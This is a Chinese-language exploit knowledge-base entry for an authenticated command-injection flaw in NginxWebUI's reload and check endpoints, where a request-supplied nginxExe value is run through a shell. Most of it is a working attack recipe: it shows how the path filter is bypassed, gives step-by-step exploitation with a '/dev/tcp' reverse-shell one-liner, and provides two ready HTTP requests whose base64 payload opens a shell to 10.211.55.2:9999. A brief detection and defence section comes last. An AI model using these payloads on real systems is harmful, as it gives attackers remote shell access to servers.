---
id: web-java-rce-nginxwebui-reload-check-nginxexe-rce
title: NginxWebUI reload/check 直接拼接 nginxExe 执行：非 null 请求参数绕过 handlePath 实现 bash -c 反弹
type: scenario
domain: web
path: web/java/rce
technique: nginxwebui-reload-check-nginxexe-rce
tags:
- java
- nginxwebui
- rce
- command-injection
- runtimeutil
- reload
- check
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: 3.9.8（原文审计版本；原文称 3.9.9 未修复这些点）
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:41:09+08:00'
  notes: 已对照原文图37-46核对；reload/check 仅在参数为 null 时走 handlePath、非 null 直接拼接 nginxExe 后 execForStr 与代码一致；已修正 brace 管道需用单引号包住（原文截图未加引号，本地实测外层 sh 会把 {echo,..} 拆成两词导致解码链不执行；加引号后实测可执行），并在原理节注明；目标环境 shell 行为未在 3.9.8 实例上复验；affected_versions=3.9.8 原文明确
url: /docs/web/java/rce/web-java-rce-nginxwebui-reload-check-nginxexe-rce/
draft: false
kb_aliases:
- NginxWebUI reload RCE
- check nginxExe
- ConfController 命令执行
- RuntimeUtil.execForStr 拼接
---

## 一句话结论

NginxWebUI 的 `ConfController#reload` 与 `#check` 只有在对应请求参数为 `null` 时才从设置里读取并用 `handlePath` 过滤；一旦请求显式传入 `nginxExe`/`nginxPath`/`nginxDir`，这些值就原样拼进 `nginxExe + " -s reload -c " + nginxPath`（或 `nginxExe + " -t -c " + fileTemp`）并交给 `RuntimeUtil.execForStr(cmd)`，最终 `ProcessBuilder` 执行。攻击者把 `nginxExe` 设为 `bash -c '{echo,<base64>}|{base64,-d}|{bash,-i}'`（整个 brace 管道用单引号固定，避免被外层 sh 的 brace 展开拆散），即可以 Web 进程权限反弹 shell。

## 原理

- **参数分支逻辑**：`reload(String nginxPath, String nginxExe, String nginxDir)` 中 `if (nginxPath == null) { nginxPath = handlePath(settings.get("nginxPath")); ... }`；`check(...)` 同样 `if (nginxExe == null) { ... }`。这本来是为“未传参时从设置读取”设计，但意味着**非 null 的请求值完全绕过 `handlePath`**。
- **命令拼接**：
  - `reload`：`String cmd = nginxExe + " -s reload -c " + nginxPath; if (nginxDir 非空) cmd += " -p " + nginxDir; RuntimeUtil.execForStr(cmd);`
  - `check`：先 `confService.replace(...)` 写临时配置、复制 `mime.types`，然后 `String cmd = nginxExe + " -t -c " + fileTemp; if (nginxDir 非空) cmd += " -p " + nginxDir; RuntimeUtil.execForStr(cmd);`
- **sink**：hutool `RuntimeUtil.execForStr(String cmd)` 最终 `new ProcessBuilder(handleCmds(cmds)).redirectErrorStream(true).start()`；`handleCmds` 在 Windows 用 `cmd.exe /c`、Linux 用 `/bin/sh -c`（取决于实现），因此命令串中的空格、`|`、`{}`、`$()` 都由 shell 解析。
- **payload 形态**：`nginxExe=bash -c '{echo,<base64 反弹命令>}|{base64,-d}|{bash,-i}'`，`nginxPath`/`nginxDir` 留空即可；拼接后的命令是 `bash -c '{echo,...}|{base64,-d}|{bash,-i}' -s reload -c `，外层 sh 把整段管道作为 bash -c 的命令串，内层 bash 做 brace 展开得到 `echo <b64> | base64 -d | bash -i`，后续 `-s reload -c` 成为多余位置参数（不影响反弹）。注意若不把整个管道用单引号包住，外层 sh 会先把 `{echo,<b64>}` 展开成 `echo <b64>` 两个词，bash -c 只把 `echo` 当命令串，解码链不会执行（本地实测），原文截图未带引号。`check` 同理，`-t -c <fileTemp>` 追加在 payload 后面。
- **为什么不需要 handlePath 绕过**：`reload`/`check` 对非 null 参数根本不调用过滤函数；即使调用，`handlePath` 也只删空白和部分元字符，`{echo,` 花括号、`|`（会被删）需注意——payload 中的 `|` 在 `handlePath` 会被删除，因此这里利用的正是“绕过 handlePath”的非 null 分支。若必须经过过滤，可改用 `$()` 或 `;`? `;` 也会被删；所以非 null 分支是关键。
- **认证**：两个接口在 `adminPage/conf` 后台，需先登录（默认/弱口令或其它后台入口）。

## 触发条件

- NginxWebUI 3.9.8 左右版本，攻击者已登录后台。
- 能访问 `adminPage/conf/reload` 或 `adminPage/conf/check`。
- Linux 目标有 bash/coreutils（base64）；Windows 目标有 PowerShell/cmd。
- `RuntimeUtil` 通过 shell 执行拼接字符串（默认行为）。

## 利用步骤

1. 登录后台，确认 `reload`/`check` 接口可达。
2. 生成 base64 反弹命令：`echo -n 'bash -i >& /dev/tcp/IP/PORT 0>&1' | base64 -w0`。
3. 构造 `nginxExe=bash -c '{echo,<b64>}|{base64,-d}|{bash,-i}'`，`nginxPath=`、`nginxDir=` 留空。
4. POST 到 `/adminPage/conf/reload`（或 `/check`，`json` 传默认结构即可）。
5. 监听端收到 shell；若失败，换 `$()`/变量拆分或改用 `check` 的 `fileTemp` 位置。

## PoC

```http
POST /adminPage/conf/reload HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nginxPath=&nginxExe=bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIxMS41NS4yLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'&nginxDir=
```

```http
POST /adminPage/conf/check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nginxPath=&nginxExe=bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIxMS41NS4yLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'&nginxDir=&json={"nginxContent":"dGVzdA==","subContent":"","subName":""}
```

## 变体与关联

- 变体：把 `nginxDir` 设为 `-p` 以外的内容制造参数注入；或利用 `check` 的 `json.nginxContent` base64 内容写入临时配置后再由 nginx 解析（配置注入）。
- 关联：[[web-java-rce-nginxwebui-runcmd-allowlist-selfcheck-bypass]]（同产品 runCmd 的自校验绕过，多了 isAvailableCmd 一层）。
- 关联：[[web-java-rce-runtime-exec-string-tokenizer-bash-revshell]]（Java `Runtime.exec` 字符串分词与 shell 包装的通用背景）。

## 检测与防御

- 检测：`reload`/`check` 请求的 `nginxExe` 含空格、`-c`、`{echo,`、`|`、`$()`；`nginxPath`/`nginxDir` 含 shell 元字符。
- 检测：Web 进程出现 `bash -c`/`sh -c`/`cmd /c` 子进程；nginx 配置检查接口触发异常外联。
- 防御：请求参数只接受配置项白名单/路径格式校验，禁止包含空格与 shell 元字符；不要用字符串拼接执行命令，改用 `ProcessBuilder` 参数数组并禁止 shell；后台最小权限与访问控制；升级修复版本。
